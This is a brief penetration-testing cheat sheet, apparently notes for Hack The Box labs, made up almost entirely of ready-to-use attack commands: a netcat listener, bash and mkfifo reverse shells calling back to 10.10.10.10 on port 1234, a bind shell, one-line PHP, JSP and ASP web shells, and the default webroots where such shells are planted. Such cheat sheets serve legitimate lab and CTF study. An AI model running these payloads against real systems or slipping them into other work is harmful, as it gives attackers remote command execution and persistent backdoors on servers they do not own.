## 🎧 The Listener (Your Machine)

Bash

```
# Flags: -l (listen), -v (verbose), -n (no DNS), -p (port)
nc -lvnp 1234
```

## 🚀 Reverse Shell Payloads

|**OS**|**Command**|
|---|---|
|**Linux (Bash)**|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|
|**Linux (MKFIFO)**|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|
|**Windows (PS)**|_[See long PowerShell TCPClient script in HTB material]_|

## ⛓️ Bind Shell Payloads

|**OS**|**Command**|
|---|---|
|**Linux (Bash)**|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|
|**Python**|`python -c 'exec("""import socket as s...""")'`|

## 🐚 Web Shell One-Liners

- **PHP:** `<?php system($_REQUEST["cmd"]); ?>`
    
- **JSP:** `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
    
- **ASP:** `<% eval request("cmd") %>`
    

**Common Webroots:**

- **Apache:** `/var/www/html/`
    
- **Nginx:** `/usr/local/nginx/html/`
    
- **IIS:** `C:\inetpub\wwwroot\`